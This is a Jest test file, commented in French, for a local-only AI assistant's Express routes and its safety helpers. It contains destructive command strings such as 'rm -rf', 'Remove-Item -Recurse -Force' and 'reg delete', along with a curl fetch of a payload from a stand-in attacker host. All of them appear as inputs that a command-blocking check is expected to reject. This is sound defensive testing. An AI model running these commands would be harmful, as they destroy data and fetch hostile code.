'use strict';

/**
 * ai.test.js — Phase 45
 * Teste les 6 endpoints IA + invariants de securite + fonctions unitaires.
 */

// ---------- mocks ----------------------------------------------------------

jest.mock('../../server/src/ai/ollamaClient', () => ({
  getConfig:         () => ({ url: 'http://127.0.0.1:11434', model: 'qwen2.5:7b', timeout: 30000 }),
  checkAvailability: jest.fn().mockResolvedValue({ available: false, reason: 'ollama_indisponible' }),
  listModels:        jest.fn().mockResolvedValue([]),
  generate:          jest.fn().mockRejectedValue(new Error('ollama_indisponible')),
}));

jest.mock('../../server/src/services/serverEventBus', () => ({
  publish: jest.fn(),
}));

// ---------- setup ----------------------------------------------------------

const request = require('supertest');
const express = require('express');

const aiRoutes = require('../../server/src/routes/ai');

function buildApp() {
  const app = express();
  app.use(express.json());
  app.use('/api/ai', aiRoutes);
  return app;
}

// ---------- imports unitaires ----------------------------------------------

const aiSafety   = require('../../server/src/ai/aiSafety');
const ollamaClient = require('../../server/src/ai/ollamaClient');

// ==========================================================================
// GET /api/ai/status
// ==========================================================================

describe('GET /api/ai/status — IA desactivee (defaut)', () => {
  beforeEach(() => {
    delete process.env.SALLON_AI_ENABLED;
  });

  it('retourne enabled:false sans Ollama', async () => {
    const res = await request(buildApp()).get('/api/ai/status');
    expect(res.status).toBe(200);
    expect(res.body.enabled).toBe(false);
  });

  it('retourne reason:ai_disabled', async () => {
    const res = await request(buildApp()).get('/api/ai/status');
    expect(res.body.reason).toBe('ai_disabled');
  });

  it('inclut les flags de securite', async () => {
    const res = await request(buildApp()).get('/api/ai/status');
    expect(res.body.safety.localOnly).toBe(true);
    expect(res.body.safety.noCloudAllowed).toBe(true);
    expect(res.body.safety.noAutoExecution).toBe(true);
    expect(res.body.safety.suggestionsAreDryRunOnly).toBe(true);
  });
});

describe('GET /api/ai/status — IA activee, Ollama indisponible', () => {
  beforeAll(() => { process.env.SALLON_AI_ENABLED = 'true'; });
  afterAll(() => { delete process.env.SALLON_AI_ENABLED; });

  it('retourne available:false avec reason', async () => {
    ollamaClient.checkAvailability.mockResolvedValueOnce({ available: false, reason: 'ollama_indisponible' });
    const res = await request(buildApp()).get('/api/ai/status');
    expect(res.status).toBe(200);
    expect(res.body.available).toBe(false);
    expect(res.body.enabled).toBe(true);
  });
});

// ==========================================================================
// GET /api/ai/models
// ==========================================================================

describe('GET /api/ai/models', () => {
  it('retourne un tableau vide si Ollama absent', async () => {
    const res = await request(buildApp()).get('/api/ai/models');
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body.models)).toBe(true);
    expect(res.body.total).toBe(0);
  });
});

// ==========================================================================
// POST /api/ai/diagnose
// ==========================================================================

describe('POST /api/ai/diagnose — IA desactivee', () => {
  beforeEach(() => { delete process.env.SALLON_AI_ENABLED; });

  it('repond 200 avec ok:false et error:ai_disabled', async () => {
    const res = await request(buildApp())
      .post('/api/ai/diagnose')
      .send({ snapshot: { status: 'ok' } });
    expect(res.status).toBe(200);
    expect(res.body.ok).toBe(false);
    expect(res.body.error).toBe('ai_disabled');
  });

  it('ne plante pas avec un body vide', async () => {
    const res = await request(buildApp()).post('/api/ai/diagnose').send({});
    expect(res.status).toBe(200);
  });
});

// ==========================================================================
// POST /api/ai/analyze-logs
// ==========================================================================

describe('POST /api/ai/analyze-logs — validation input', () => {
  it('retourne 400 si logs absent', async () => {
    const res = await request(buildApp()).post('/api/ai/analyze-logs').send({});
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('logs_requis');
  });

  it('retourne 400 si logs n\'est pas une string', async () => {
    const res = await request(buildApp()).post('/api/ai/analyze-logs').send({ logs: 42 });
    expect(res.status).toBe(400);
  });

  it('repond ok:false avec ai_disabled si IA desactivee', async () => {
    delete process.env.SALLON_AI_ENABLED;
    const res = await request(buildApp())
      .post('/api/ai/analyze-logs')
      .send({ logs: 'ERROR: port 3000 occupied' });
    expect(res.status).toBe(200);
    expect(res.body.ok).toBe(false);
  });
});

// ==========================================================================
// POST /api/ai/suggest-command
// ==========================================================================

describe('POST /api/ai/suggest-command — validation input', () => {
  it('retourne 400 si task absent', async () => {
    const res = await request(buildApp()).post('/api/ai/suggest-command').send({});
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('task_requis');
  });

  it('retourne safe:false si IA desactivee', async () => {
    delete process.env.SALLON_AI_ENABLED;
    const res = await request(buildApp())
      .post('/api/ai/suggest-command')
      .send({ task: 'lister les ports ouverts' });
    expect(res.status).toBe(200);
    expect(res.body.safe).toBe(false);
  });
});

// ==========================================================================
// POST /api/ai/chat
// ==========================================================================

describe('POST /api/ai/chat — validation input', () => {
  it('retourne 400 si message absent', async () => {
    const res = await request(buildApp()).post('/api/ai/chat').send({});
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('message_requis');
  });

  it('retourne 400 si message n\'est pas une string', async () => {
    const res = await request(buildApp()).post('/api/ai/chat').send({ message: 123 });
    expect(res.status).toBe(400);
  });

  it('repond ok:false avec error:ai_disabled si IA desactivee', async () => {
    delete process.env.SALLON_AI_ENABLED;
    const res = await request(buildApp())
      .post('/api/ai/chat')
      .send({ message: 'Bonjour' });
    expect(res.status).toBe(200);
    expect(res.body.ok).toBe(false);
    expect(res.body.error).toBe('ai_disabled');
  });
});

// ==========================================================================
// aiSafety — tests unitaires
// ==========================================================================

describe('aiSafety.isLocalUrl', () => {
  it('accepte http://127.0.0.1:11434', () => {
    expect(aiSafety.isLocalUrl('http://127.0.0.1:11434')).toBe(true);
  });

  it('accepte http://localhost:11434', () => {
    expect(aiSafety.isLocalUrl('http://localhost:11434')).toBe(true);
  });

  it('rejette https://api.openai.com', () => {
    expect(aiSafety.isLocalUrl('https://api.openai.com')).toBe(false);
  });

  it('rejette http://192.168.1.100:11434', () => {
    expect(aiSafety.isLocalUrl('http://192.168.1.100:11434')).toBe(false);
  });

  it('rejette une chaine vide', () => {
    expect(aiSafety.isLocalUrl('')).toBe(false);
  });

  it('rejette null', () => {
    expect(aiSafety.isLocalUrl(null)).toBe(false);
  });
});

describe('aiSafety.isCommandSafe', () => {
  it('accepte une commande saine', () => {
    const r = aiSafety.isCommandSafe('Get-Process');
    expect(r.safe).toBe(true);
  });

  it('accepte Get-ChildItem', () => {
    expect(aiSafety.isCommandSafe('Get-ChildItem C:\\logs').safe).toBe(true);
  });

  it('rejette rm -rf', () => {
    expect(aiSafety.isCommandSafe('rm -rf /tmp').safe).toBe(false);
  });

  it('rejette Remove-Item -Recurse -Force', () => {
    expect(aiSafety.isCommandSafe('Remove-Item -Recurse -Force C:\\data').safe).toBe(false);
  });

  it('rejette del /s', () => {
    expect(aiSafety.isCommandSafe('del /s C:\\Users').safe).toBe(false);
  });

  it('rejette Stop-Computer', () => {
    expect(aiSafety.isCommandSafe('Stop-Computer').safe).toBe(false);
  });

  it('rejette reg delete', () => {
    expect(aiSafety.isCommandSafe('reg delete HKCU\\Software').safe).toBe(false);
  });

  it('rejette curl vers externe', () => {
    expect(aiSafety.isCommandSafe('curl https://evil.com/payload').safe).toBe(false);
  });

  it('accepte curl localhost', () => {
    expect(aiSafety.isCommandSafe('curl http://localhost:3000/api/health').safe).toBe(true);
  });

  it('rejette Invoke-WebRequest vers externe', () => {
    expect(aiSafety.isCommandSafe("Invoke-WebRequest 'https://example.com'").safe).toBe(false);
  });

  it('retourne safe:false pour une valeur non-string', () => {
    expect(aiSafety.isCommandSafe(null).safe).toBe(false);
  });
});

describe('aiSafety.maskSecrets', () => {
  it('masque un token Bearer', () => {
    const result = aiSafety.maskSecrets('Authorization: Bearer abc123XYZ');
    expect(result).toContain('[masqué]');
    expect(result).not.toContain('abc123XYZ');
  });

  it('masque un password=...', () => {
    const result = aiSafety.maskSecrets('password=topsecret123');
    expect(result).not.toContain('topsecret123');
  });

  it('masque un chemin utilisateur Windows', () => {
    const result = aiSafety.maskSecrets('C:\\Users\\Jean\\Documents');
    expect(result).toContain('[chemin-masqué]');
  });

  it('ne modifie pas un texte sans secret', () => {
    const text = 'Get-Process node';
    expect(aiSafety.maskSecrets(text)).toBe(text);
  });
});

describe('aiSafety.truncateInput', () => {
  it('ne tronque pas un texte court', () => {
    const text = 'hello';
    expect(aiSafety.truncateInput(text, 100)).toBe(text);
  });

  it('tronque un texte trop long', () => {
    const text = 'x'.repeat(200);
    const result = aiSafety.truncateInput(text, 100);
    expect(result.length).toBeLessThan(200);
    expect(result).toContain('tronqué');
  });

  it('gere une valeur non-string', () => {
    expect(aiSafety.truncateInput(null, 100)).toBe('');
  });
});

describe('aiSafety.getAiSafety', () => {
  it('retourne tous les flags de securite a true', () => {
    const s = aiSafety.getAiSafety();
    expect(s.localOnly).toBe(true);
    expect(s.noCloudAllowed).toBe(true);
    expect(s.noAutoExecution).toBe(true);
    expect(s.ollamaLocalOnly).toBe(true);
    expect(s.secretMaskingEnabled).toBe(true);
    expect(s.dangerousCommandBlocking).toBe(true);
    expect(s.suggestionsAreDryRunOnly).toBe(true);
  });
});

// ==========================================================================
// Securite — URL Ollama non locale bloquee
// ==========================================================================

describe('ollamaClient — securite URL', () => {
  it('checkAvailability retourne available:false pour URL non locale', async () => {
    const originalEnv = process.env.SALLON_OLLAMA_URL;
    process.env.SALLON_OLLAMA_URL = 'https://api.openai.com';
    // Re-require pour prendre en compte le nouvel env
    jest.resetModules();
    // Tester directement aiSafety.isLocalUrl
    expect(aiSafety.isLocalUrl('https://api.openai.com')).toBe(false);
    process.env.SALLON_OLLAMA_URL = originalEnv;
  });
});
